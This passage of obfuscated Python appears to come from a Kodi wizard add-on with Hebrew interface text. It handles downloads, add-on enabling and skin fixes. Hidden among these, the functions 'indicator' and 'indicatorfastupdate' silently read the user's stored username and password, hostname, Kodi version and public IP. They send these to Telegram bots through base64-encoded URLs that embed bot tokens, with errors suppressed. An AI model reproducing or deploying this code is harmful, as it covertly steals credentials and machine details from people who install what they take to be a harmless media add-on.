        OOOOO00OO00O00000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00OOO0OO0OO00O0 ,'teal',OO0O000O00OO00000 )#line:3480
        if (time .time ()-O00O00O0000000OOO )>0 :#line:3481
          O00OO0OO0OO00O0O0 =O00O000OO0O00O0O0 /(time .time ()-O00O00O0000000OOO )#line:3482
          O00OO0OO0OO00O0O0 =O00OO0OO0OO00O0O0 /1024 #line:3483
        else :#line:3484
         O00OO0OO0OO00O0O0 =0 #line:3485
        OO000OOO0O0O000OO ='KB'#line:3486
        if O00OO0OO0OO00O0O0 >=1024 :#line:3487
           O00OO0OO0OO00O0O0 =O00OO0OO0OO00O0O0 /1024 #line:3488
           OO000OOO0O0O000OO ='MB'#line:3489
        if O00OO0OO0OO00O0O0 >0 and not O0OO0O00OOOO00OO0 ==100 :#line:3490
            O00000OOO0O0O0OOO =(O000O0OOO0O00O0OO -O00O000OO0O00O0O0 )/O00OO0OO0OO00O0O0 #line:3491
        else :#line:3492
            O00000OOO0O0O0OOO =0 #line:3493
        O000O000O000O0000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00OO0OO0OO00O0O0 ,OO000OOO0O0O000OO )#line:3494
        OOO00OOO000O0OOOO .update (int (O0OO0O00OOOO00OO0 ),"Downloading "+name ,OOOOO00OO00O00000 ,O000O000O000O0000 )#line:3496
  OO000OOO00OOO0000 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3499
  O000OO0OOO00OOO0O .close ()#line:3501
  extract (OO000O0O00OO00O00 ,OO000OOO00OOO0000 ,OOO00OOO000O0OOOO )#line:3503
  if os .path .exists (OO000OOO00OOO0000 +'/scakemyer-script.quasar.burst'):#line:3504
    if os .path .exists (OO000OOO00OOO0000 +'/script.quasar.burst'):#line:3505
     shutil .rmtree (OO000OOO00OOO0000 +'/script.quasar.burst',ignore_errors =False )#line:3506
    os .rename (OO000OOO00OOO0000 +'/scakemyer-script.quasar.burst',OO000OOO00OOO0000 +'/script.quasar.burst')#line:3507
  if os .path .exists (OO000OOO00OOO0000 +'/plugin.video.kmediatorrent-master'):#line:3509
    if os .path .exists (OO000OOO00OOO0000 +'/plugin.video.kmediatorrent'):#line:3510
     shutil .rmtree (OO000OOO00OOO0000 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3511
    os .rename (OO000OOO00OOO0000 +'/plugin.video.kmediatorrent-master',OO000OOO00OOO0000 +'/plugin.video.kmediatorrent')#line:3512
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3513
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3514
  try :#line:3515
    os .remove (OO000O0O00OO00O00 )#line:3516
  except :#line:3517
    pass #line:3518
  OOO00OOO000O0OOOO .close ()#line:3519
def dis_or_enable_addon (O00OO00O0O0OOOO0O ,O0O00OO0O0O0O00O0 ,enable ="true"):#line:3520
    import json #line:3521
    O00O0O00O0OO00O0O ='"%s"'%O00OO00O0O0OOOO0O #line:3522
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O00OO00O0O0OOOO0O )and enable =="true":#line:3523
        logging .warning ('already Enabled')#line:3524
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O00OO00O0O0OOOO0O )#line:3525
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O00OO00O0O0OOOO0O )and enable =="false":#line:3526
        return xbmc .log ("### Skipped %s, reason = not installed"%O00OO00O0O0OOOO0O )#line:3527
    else :#line:3528
        O0O000O0OO0O0OOO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00O0O00O0OO00O0O ,enable )#line:3529
        OOOOOOO00OO00O000 =xbmc .executeJSONRPC (O0O000O0OO0O0OOO0 )#line:3530
        OOOOOO00O0O0OOO0O =json .loads (OOOOOOO00OO00O000 )#line:3531
        if enable =="true":#line:3532
            xbmc .log ("### Enabled %s, response = %s"%(O00OO00O0O0OOOO0O ,OOOOOO00O0O0OOO0O ))#line:3533
        else :#line:3534
            xbmc .log ("### Disabled %s, response = %s"%(O00OO00O0O0OOOO0O ,OOOOOO00O0O0OOO0O ))#line:3535
    if O0O00OO0O0O0O00O0 =='auto':#line:3536
     return True #line:3537
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3538
def chunk_report (O0O000OO0O0OO0OOO ,O0O000O00O0000000 ,OO000OO0OOOO0OO00 ):#line:3539
   OOO0OO0OOO0O0000O =float (O0O000OO0O0OO0OOO )/OO000OO0OOOO0OO00 #line:3540
   OOO0OO0OOO0O0000O =round (OOO0OO0OOO0O0000O *100 ,2 )#line:3541
   if O0O000OO0O0OO0OOO >=OO000OO0OOOO0OO00 :#line:3543
      sys .stdout .write ('\n')#line:3544
def chunk_read (OO00O0OOO0OO000OO ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3546
   import time #line:3547
   OO0OO0O000OO0OOO0 =int (filesize )*1000000 #line:3548
   OO00000O0OO0O000O =0 #line:3550
   OOOO00O0OOOOO0O0O =time .time ()#line:3551
   OO0O0O00O0O0OO0O0 =0 #line:3552
   logging .warning ('Downloading')#line:3554
   with open (destination ,"wb")as O0O0O0OOO00OOO00O :#line:3555
    while 1 :#line:3556
      O0O0OO0OO000OOOOO =time .time ()-OOOO00O0OOOOO0O0O #line:3557
      OOO0OO0OOO00O00O0 =int (OO0O0O00O0O0OO0O0 *chunk_size )#line:3558
      O0000O000O0OO0OOO =OO00O0OOO0OO000OO .read (chunk_size )#line:3559
      O0O0O0OOO00OOO00O .write (O0000O000O0OO0OOO )#line:3560
      O0O0O0OOO00OOO00O .flush ()#line:3561
      OO00000O0OO0O000O +=len (O0000O000O0OO0OOO )#line:3562
      O0OO00OOOO0O0O0OO =float (OO00000O0OO0O000O )/OO0OO0O000OO0OOO0 #line:3563
      O0OO00OOOO0O0O0OO =round (O0OO00OOOO0O0O0OO *100 ,2 )#line:3564
      if int (O0O0OO0OO000OOOOO )>0 :#line:3565
        OO00OO0OO0OO000OO =int (OOO0OO0OOO00O00O0 /(1024 *O0O0OO0OO000OOOOO ))#line:3566
      else :#line:3567
         OO00OO0OO0OO000OO =0 #line:3568
      if OO00OO0OO0OO000OO >1024 and not O0OO00OOOO0O0O0OO ==100 :#line:3569
          O0OO000000O00OO0O =int (((OO0OO0O000OO0OOO0 -OOO0OO0OOO00O00O0 )/1024 )/(OO00OO0OO0OO000OO ))#line:3570
      else :#line:3571
          O0OO000000O00OO0O =0 #line:3572
      if O0OO000000O00OO0O <0 :#line:3573
        O0OO000000O00OO0O =0 #line:3574
      dp .update (int (O0OO00OOOO0O0O0OO ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0OO00OOOO0O0O0OO ,OOO0OO0OOO00O00O0 /(1024 *1024 ),OO0OO0O000OO0OOO0 /(1000 *1000 ),OO00OO0OO0OO000OO ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O0OO000000O00OO0O ,60 ))#line:3575
      if dp .iscanceled ():#line:3576
         dp .close ()#line:3577
         break #line:3578
      if not O0000O000O0OO0OOO :#line:3579
         break #line:3580
      if report_hook :#line:3582
         report_hook (OO00000O0OO0O000O ,chunk_size ,OO0OO0O000OO0OOO0 )#line:3583
      OO0O0O00O0O0OO0O0 +=1 #line:3584
   logging .warning ('END Downloading')#line:3585
   return OO00000O0OO0O000O #line:3586
def googledrive_download (O0OOO0O000O0000OO ,O000OOOO0O0OO0OO0 ,O00OOO0O000O0OO00 ,O0O00OOOOO0OO0000 ):#line:3588
    O0O0O0OO0OOO0O0O0 =[]#line:3592
    OO0OO00OO0OOO00OO =O0OOO0O000O0000OO .split ('=')#line:3593
    O0OOO0O000O0000OO =OO0OO00OO0OOO00OO [len (OO0OO00OO0OOO00OO )-1 ]#line:3594
    def OO0OO0O0OO0OOOO00 (OOOO0OOO00OO0O000 ):#line:3596
        for OOOOOO000000000O0 in OOOO0OOO00OO0O000 :#line:3598
            logging .warning ('cookie.name')#line:3599
            logging .warning (OOOOOO000000000O0 .name )#line:3600
            OO0O0OOO0OOO00O00 =OOOOOO000000000O0 .value #line:3601
            if 'download_warning'in OOOOOO000000000O0 .name :#line:3602
                logging .warning (OOOOOO000000000O0 .value )#line:3603
                logging .warning ('cookie.value')#line:3604
                return OOOOOO000000000O0 .value #line:3605
            return OO0O0OOO0OOO00O00 #line:3606
        return None #line:3608
    def O0OOOOO000O0O000O (O00O0000O0O0OO00O ,OOO000O00000OOOOO ):#line:3610
        OO00000O0O00OOOO0 =32768 #line:3612
        O0OO0O00000OO0000 =time .time ()#line:3613
        with open (OOO000O00000OOOOO ,"wb")as OO000000OOOOOO000 :#line:3615
            OOOO0OO00OOO0OOOO =1 #line:3616
            OOO00OO000O00O0O0 =32768 #line:3617
            try :#line:3618
                O0O0O00OOOO0OO00O =int (O00O0000O0O0OO00O .headers .get ('content-length'))#line:3619
                print ('file total size :',O0O0O00OOOO0OO00O )#line:3620
            except TypeError :#line:3621
                print ('using dummy length !!!')#line:3622
                O0O0O00OOOO0OO00O =int (O0O00OOOOO0OO0000 )*1000000 #line:3623
            for OO00OOOOOOOOOOO00 in O00O0000O0O0OO00O .iter_content (OO00000O0O00OOOO0 ):#line:3624
                if OO00OOOOOOOOOOO00 :#line:3625
                    OO000000OOOOOO000 .write (OO00OOOOOOOOOOO00 )#line:3626
                    OO000000OOOOOO000 .flush ()#line:3627
                    O0OO0OOOOOO00O000 =time .time ()-O0OO0O00000OO0000 #line:3628
                    OOO00OO000O000OO0 =int (OOOO0OO00OOO0OOOO *OOO00OO000O00O0O0 )#line:3629
                    if O0OO0OOOOOO00O000 ==0 :#line:3630
                        O0OO0OOOOOO00O000 =0.1 #line:3631
                    OOO0OO0O0000000O0 =int (OOO00OO000O000OO0 /(1024 *O0OO0OOOOOO00O000 ))#line:3632
                    OO00O0OOO0000O00O =int (OOOO0OO00OOO0OOOO *OOO00OO000O00O0O0 *100 /O0O0O00OOOO0OO00O )#line:3633
                    if OOO0OO0O0000000O0 >1024 and not OO00O0OOO0000O00O ==100 :#line:3634
                      O0O0O0OO00O00OO00 =int (((O0O0O00OOOO0OO00O -OOO00OO000O000OO0 )/1024 )/(OOO0OO0O0000000O0 ))#line:3635
                    else :#line:3636
                      O0O0O0OO00O00OO00 =0 #line:3637
                    O00OOO0O000O0OO00 .update (int (OO00O0OOO0000O00O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO00O0OOO0000O00O ,OOO00OO000O000OO0 /(1024 *1024 ),O0O0O00OOOO0OO00O /(1000 *1000 ),OOO0OO0O0000000O0 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O0O0OO00O00OO00 ,60 ))#line:3639
                    OOOO0OO00OOO0OOOO +=1 #line:3640
                    if O00OOO0O000O0OO00 .iscanceled ():#line:3641
                     O00OOO0O000O0OO00 .close ()#line:3642
                     break #line:3643
    O00O00O0OOO0O0O00 ="https://docs.google.com/uc?export=download"#line:3644
    import urllib2 #line:3649
    import cookielib #line:3650
    from cookielib import CookieJar #line:3652
    O0O0000OOO00O000O =CookieJar ()#line:3654
    O0000O0O0O0OOOOOO =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0O0000OOO00O000O ))#line:3655
    OOOOOO00O0O000OOO ={'id':O0OOO0O000O0000OO }#line:3657
    OOOOO0OOOO0O0O0O0 =urllib .urlencode (OOOOOO00O0O000OOO )#line:3658
    logging .warning (O00O00O0OOO0O0O00 +'&'+OOOOO0OOOO0O0O0O0 )#line:3659
    OOO0OOO000O0O0OO0 =O0000O0O0O0OOOOOO .open (O00O00O0OOO0O0O00 +'&'+OOOOO0OOOO0O0O0O0 )#line:3660
    O0OO00000000000O0 =OOO0OOO000O0O0OO0 .read ()#line:3661
    for OOOOOO0OOO00O0OO0 in O0O0000OOO00O000O :#line:3663
         logging .warning (OOOOOO0OOO00O0OO0 )#line:3664
    O00OO0O00O00OOOOO =OO0OO0O0OO0OOOO00 (O0O0000OOO00O000O )#line:3665
    logging .warning (O00OO0O00O00OOOOO )#line:3666
    if O00OO0O00O00OOOOO :#line:3667
        O0O0O0OO00O00O000 ={'id':O0OOO0O000O0000OO ,'confirm':O00OO0O00O00OOOOO }#line:3668
        O000O00O0OO0O00OO ={'Access-Control-Allow-Headers':'Content-Length'}#line:3669
        OOOOO0OOOO0O0O0O0 =urllib .urlencode (O0O0O0OO00O00O000 )#line:3670
        OOO0OOO000O0O0OO0 =O0000O0O0O0OOOOOO .open (O00O00O0OOO0O0O00 +'&'+OOOOO0OOOO0O0O0O0 )#line:3671
        chunk_read (OOO0OOO000O0O0OO0 ,report_hook =chunk_report ,dp =O00OOO0O000O0OO00 ,destination =O000OOOO0O0OO0OO0 ,filesize =O0O00OOOOO0OO0000 )#line:3672
    return (O0O0O0OO0OOO0O0O0 )#line:3676
def kodi17Fix ():#line:3677
	O0OOOO0OO0000O0O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3678
	O0OOO0OOO0OOOOO00 =[]#line:3679
	for OOO00O0O0O00O0O00 in sorted (O0OOOO0OO0000O0O0 ,key =lambda OOOO0O0OO0O00O000 :OOOO0O0OO0O00O000 ):#line:3680
		O0O00OO0O00OO0OOO =os .path .join (OOO00O0O0O00O0O00 ,'addon.xml')#line:3681
		if os .path .exists (O0O00OO0O00OO0OOO ):#line:3682
			OO0O000OOOO00O0O0 =OOO00O0O0O00O0O00 .replace (ADDONS ,'')[1 :-1 ]#line:3683
			O000O0O0OO0OO000O =open (O0O00OO0O00OO0OOO )#line:3684
			O0O0O000O0000O0OO =O000O0O0OO0OO000O .read ()#line:3685
			OOO00000O0OOO000O =parseDOM (O0O0O000O0000O0OO ,'addon',ret ='id')#line:3686
			O000O0O0OO0OO000O .close ()#line:3687
			try :#line:3688
				O000O00O00OOOO000 =xbmcaddon .Addon (id =OOO00000O0OOO000O [0 ])#line:3689
			except :#line:3690
				try :#line:3691
					log ("%s was disabled"%OOO00000O0OOO000O [0 ],xbmc .LOGDEBUG )#line:3692
					O0OOO0OOO0OOOOO00 .append (OOO00000O0OOO000O [0 ])#line:3693
				except :#line:3694
					try :#line:3695
						log ("%s was disabled"%OO0O000OOOO00O0O0 ,xbmc .LOGDEBUG )#line:3696
						O0OOO0OOO0OOOOO00 .append (OO0O000OOOO00O0O0 )#line:3697
					except :#line:3698
						if len (OOO00000O0OOO000O )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OO0O000OOOO00O0O0 ,xbmc .LOGERROR )#line:3699
						else :log ("Unabled to enable: %s"%OOO00O0O0O00O0O00 ,xbmc .LOGERROR )#line:3700
	if len (O0OOO0OOO0OOOOO00 )>0 :#line:3701
		OOOOOO00O0O00000O =0 #line:3702
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3703
		for O0O0O0O0OOOOO0O0O in O0OOO0OOO0OOOOO00 :#line:3704
			OOOOOO00O0O00000O +=1 #line:3705
			OO00OOOOOO0O0O00O =int (percentage (OOOOOO00O0O00000O ,len (O0OOO0OOO0OOOOO00 )))#line:3706
			DP .update (OO00OOOOOO0O0O00O ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0O0O0OOOOO0O0O ))#line:3707
			addonDatabase (O0O0O0O0OOOOO0O0O ,1 )#line:3708
			if DP .iscanceled ():break #line:3709
		if DP .iscanceled ():#line:3710
			DP .close ()#line:3711
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3712
			sys .exit ()#line:3713
		DP .close ()#line:3714
	forceUpdate ()#line:3715
def indicator ():#line:3717
       try :#line:3718
          import json #line:3719
          wiz .log ('FRESH MESSAGE')#line:3720
          O0000OOO000O0OO00 =(ADDON .getSetting ("user"))#line:3721
          O00000O0OO00O0OO0 =(ADDON .getSetting ("pass"))#line:3722
          OO0OO00O0000000O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3723
          O0O00O000O0OO0OOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3724
          OO000OO00O0O0O000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3725
          OOO0O0O00OO00O0O0 =str (json .loads (OO000OO00O0O0O000 )['ip'])#line:3726
          O0OO0OOO0OOO00O00 =O0000OOO000O0OO00 #line:3727
          OO000O0O0O0OO0OOO =O00000O0OO00O0OO0 #line:3728
          import socket #line:3729
          OO000OO00O0O0O000 =urllib2 .urlopen (O0O00O000O0OO0OOO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0OO0OOO0OOO00O00 +' - '+OO000O0O0O0OO0OOO +' - '+OO0OO00O0000000O0 +' - '+OOO0O0O00OO00O0O0 ).readlines ()#line:3730
       except :pass #line:3732
def indicatorfastupdate ():#line:3734
       try :#line:3735
          import json #line:3736
          wiz .log ('FRESH MESSAGE')#line:3737
          O00OO0O0000O0000O =(ADDON .getSetting ("user"))#line:3738
          O0O000O0OO0O0000O =(ADDON .getSetting ("pass"))#line:3739
          OO0OOOO0O0O000000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3740
          O0O00OOOO00OOOOO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3742
          OO0O000OOO0O000OO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3743
          O000O000O0O00OO00 =str (json .loads (OO0O000OOO0O000OO )['ip'])#line:3744
          O0OOO0OOO0OOO0O0O =O00OO0O0000O0000O #line:3745
          OO00OOOO0O0O0OO0O =O0O000O0OO0O0000O #line:3746
          import socket #line:3748
          OO0O000OOO0O000OO =urllib2 .urlopen (O0O00OOOO00OOOOO0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0OOO0OOO0OOO0O0O +' - '+OO00OOOO0O0O0OO0O +' - '+OO0OOOO0O0O000000 +' - '+O000O000O0O00OO00 ).readlines ()#line:3749
       except :pass #line:3751
def skinfix18 ():#line:3753
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3754
		OO00OO0O00OO00OOO =wiz .workingURL (SKINID18DDONXML )#line:3755
		if OO00OO0O00OO00OOO ==True :#line:3756
			OOO000OO00OOOOOOO =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3757
			if len (OOO000OO00OOOOOOO )>0 :#line:3758
				O0O0O00000O0O0OOO ='%s-%s.zip'%(SKINID18 ,OOO000OO00OOOOOOO [0 ])#line:3759
				OO000OO0000OO0000 =wiz .workingURL (SKIN18ZIPURL +O0O0O00000O0O0OOO )#line:3760
				if OO000OO0000OO0000 ==True :#line:3761
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3762
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3763
					O0O00OO0OO00O00OO =os .path .join (PACKAGES ,O0O0O00000O0O0OOO )#line:3764
					try :os .remove (O0O00OO0OO00O00OO )#line:3765
					except :pass #line:3766
					downloader .download (SKIN18ZIPURL +O0O0O00000O0O0OOO ,O0O00OO0OO00O00OO ,DP )#line:3767
					extract .all (O0O00OO0OO00O00OO ,HOME ,DP )#line:3768
					try :#line:3769
						OO000OO0O0000O000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3770
						OOO0O0OO0000O0O0O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3771
						os .rename (OO000OO0O0000O000 ,OOO0O0OO0000O0O0O )#line:3772
					except :#line:3773
						pass #line:3774
					try :#line:3775
						OOOO00O0OO0OOOO0O =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO000000O00O000O0 =OOOO00O0OO0OOOO0O .read ();OOOO00O0OO0OOOO0O .close ()#line:3776
						OO00O0O000O00OOOO =wiz .parseDOM (OO000000O00O000O0 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3777
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00O0O000O00OOOO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3778
					except :#line:3779
						pass #line:3780
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3781
					DP .close ()#line:3782
					xbmc .sleep (500 )#line:3783
					wiz .forceUpdate (True )#line:3784
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3785
				else :#line:3786
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3787
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO000OO0000OO0000 ,xbmc .LOGERROR )#line:3788
			else :#line:3789
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3790
		else :#line:3791
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3792
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3793
def skinfix17 ():#line:3794
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3795
		OOO0OOO00O00OO0O0 =wiz .workingURL (SKINID17DDONXML )#line:3796
		if OOO0OOO00O00OO0O0 ==True :#line:3797
			OOO0O0000O000OO0O =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3798
			if len (OOO0O0000O000OO0O )>0 :#line:3799
				O0OO000O0OO0OO0OO ='%s-%s.zip'%(SKINID17 ,OOO0O0000O000OO0O [0 ])#line:3800
				OOO000O00O0OO0O00 =wiz .workingURL (SKIN17ZIPURL +O0OO000O0OO0OO0OO )#line:3801
				if OOO000O00O0OO0O00 ==True :#line:3802
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3803
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3804
					O0OOOOO000OOO0OOO =os .path .join (PACKAGES ,O0OO000O0OO0OO0OO )#line:3805
					try :os .remove (O0OOOOO000OOO0OOO )#line:3806
					except :pass #line:3807
					downloader .download (SKIN17ZIPURL +O0OO000O0OO0OO0OO ,O0OOOOO000OOO0OOO ,DP )#line:3808
					extract .all (O0OOOOO000OOO0OOO ,HOME ,DP )#line:3809
					try :#line:3810
						OOOO0O000000OOO00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3811
						OO0OOOOO0O00OOOO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3812
						os .rename (OOOO0O000000OOO00 ,OO0OOOOO0O00OOOO0 )#line:3813
					except :#line:3814
						pass #line:3815
					try :#line:3816
						O00000O0OO0O0O0OO =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O000O0O000OO0OOO0 =O00000O0OO0O0O0OO .read ();O00000O0OO0O0O0OO .close ()#line:3817
						OO0OO00OO0O000O0O =wiz .parseDOM (O000O0O000OO0OOO0 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3818
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO00OO0O000O0O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3819
					except :#line:3820
						pass #line:3821
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3822
					DP .close ()#line:3823
					xbmc .sleep (500 )#line:3824
					wiz .forceUpdate (True )#line:3825
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3826
				else :#line:3827
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3828
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOO000O00O0OO0O00 ,xbmc .LOGERROR )#line:3829
			else :#line:3830
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3831
		else :#line:3832
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3833
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3834
def fix17update ():#line:3835
	if KODIV >=17 and KODIV <18 :#line:3836
		wiz .kodi17Fix ()#line:3837
		xbmc .sleep (4000 )#line:3838
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3839
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3840
		fixfont ()#line:3841
		OOOO0OO0OOO0OO0OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3842
		try :#line:3844
			OOO000O000OOOOOOO =open (OOOO0OO0OOO0OO0OO ,'r')#line:3845
			O00OOO0O00000OO00 =OOO000O000OOOOOOO .read ()#line:3846
			OOO000O000OOOOOOO .close ()#line:3847
			OOO000000O00OO00O ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3848
			O0OOOOOO0O00000OO =re .compile (OOO000000O00OO00O ).findall (O00OOO0O00000OO00 )[0 ]#line:3849
			OOO000O000OOOOOOO =open (OOOO0OO0OOO0OO0OO ,'w')#line:3850
			OOO000O000OOOOOOO .write (O00OOO0O00000OO00 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O0OOOOOO0O00000OO ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3851
			OOO000O000OOOOOOO .close ()#line:3852
		except :#line:3853
				pass #line:3854
		wiz .kodi17Fix ()#line:3855
		OOOO0OO0OOO0OO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3856
		try :#line:3857
			OOO000O000OOOOOOO =open (OOOO0OO0OOO0OO0OO ,'r')#line:3858
			O00OOO0O00000OO00 =OOO000O000OOOOOOO .read ()#line:3859
			OOO000O000OOOOOOO .close ()#line:3860
			OOO000000O00OO00O ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3861
			O0OOOOOO0O00000OO =re .compile (OOO000000O00OO00O ).findall (O00OOO0O00000OO00 )[0 ]#line:3862
			OOO000O000OOOOOOO =open (OOOO0OO0OOO0OO0OO ,'w')#line:3863
			OOO000O000OOOOOOO .write (O00OOO0O00000OO00 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O0OOOOOO0O00000OO ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3864
			OOO000O000OOOOOOO .close ()#line:3865
		except :#line:3866
				pass #line:3867
		swapSkins ('skin.Premium.mod')#line:3868
def fix18update ():#line:3870
	if KODIV >=18 :#line:3871
		xbmc .sleep (4000 )#line:3872
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3873
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3874
		fixfont ()#line:3875
		O0OO0OO000O0000O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3876
		try :#line:3877
			OOOOOOO0O0OOO0O0O =open (O0OO0OO000O0000O0 ,'r')#line:3878
			O0O0OOOOOOO0OOO0O =OOOOOOO0O0OOO0O0O .read ()#line:3879
			OOOOOOO0O0OOO0O0O .close ()#line:3880
			OOOOOO000O00O0OOO ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3881
			O0OOOO000OO00OO00 =re .compile (OOOOOO000O00O0OOO ).findall (O0O0OOOOOOO0OOO0O )[0 ]#line:3882
			OOOOOOO0O0OOO0O0O =open (O0OO0OO000O0000O0 ,'w')#line:3883
			OOOOOOO0O0OOO0O0O .write (O0O0OOOOOOO0OOO0O .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0OOOO000OO00OO00 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3884
